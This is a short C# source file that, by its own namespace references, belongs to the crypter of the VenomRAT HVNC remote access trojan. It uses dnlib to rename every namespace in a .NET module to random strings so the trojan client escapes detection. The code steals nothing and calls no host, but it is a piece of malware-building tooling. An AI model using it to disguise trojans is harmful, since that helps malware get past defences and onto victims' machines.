using System;
using dnlib.DotNet;
using VenomRAT_HVNC.Crypter.Settings;

namespace Client.Obfuscation.SimpleTechObfuscate;

public class NameSpace
{
    public static void Obfuscate(ModuleDef md)
    {
        foreach (var type in md.GetTypes())
        {
            string encName = new GenerateKey(10).GenerateStrenghCharacter();
            Console.WriteLine($"{type.Namespace} -> {encName}");
            Ressources.Obfuscate(md, type.Namespace, encName);
            type.Namespace = encName;
        }

    }
}